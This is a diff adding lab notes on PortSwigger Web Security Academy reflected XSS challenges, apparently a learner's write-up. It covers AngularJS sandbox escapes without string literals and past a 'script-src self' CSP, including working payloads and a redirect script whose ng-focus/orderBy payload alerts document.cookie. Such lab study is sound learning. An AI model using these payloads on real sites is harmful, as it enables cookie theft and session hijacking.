@@ -295,3 +295,43 @@ window.addEventListener("load", ()=>{
 }) 
 </script>
 ```
+
+## Reflected XSS with AngularJS sandbox escape without strings
+
+Searching for `nsteng9k1'"<>&()` string returns us the page with text `0 search results for {{value}}` and a js code containing our encoded payload `nsteng9k1&apos;&quot;&lt;&gt;&()` that then would process it and change the value on the website. With further testing we can notice, that `&{}()[]|:;` are not html encoded in the response.
+
+Our reflected input is passed to the `$parse` function like this `$parse("search")({"search": <our input>})` which sets the value of param named `value` replacing then the contents of the page.
+
+We cannot pass `{{1+2}}` or simply `1+2` to invoke tamplate injection. Additionally the search term have max of 10 character, however any other query param will be accepted and the last one will be rendered to the page: `search=a&test=bbb` will result in `bbb` rendered on the page and passed to `$parse` seperately.
+
+With help from the solution `?search=a&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` this solves the lab:
+
+"The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not."
+
+## Reflected XSS with AngularJS sandbox escape and CSP
+
+It appears that we have no html encoding, but tries like `<img src="X" onerror=alert(1)/>` results in an error: `Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.`
+
+This time providing payload `{{2+2}}` results in `{{2+2}}` in the response and `4` being rendered on the page.
+
+`{{ 'a'.constructor.prototype.charAt=[].join; $eval(1+2) }}`
+
+Tries to bypass the CSP:
+ - `{{ 'a'.constructor.prototype.charAt=[].join;$eval('alert(1)') }}` - browser crash multiple times
+ - `{{ [1].map(alert) }}` - undefined not a function error
+ - `{{ [1].filter(alert) }}` - error
+ - `{{ [1].forEach(alert) }}` - error
+
+All resulted with `undefined is not a function at Array.map`
+
+According to solution this solves the lab:
+
+```
+<script>
+location='https://0ae8004e034593d7814fbbc900fc0000.web-security-academy.net//?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+```
+
+"The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
+
+Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z. The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check."
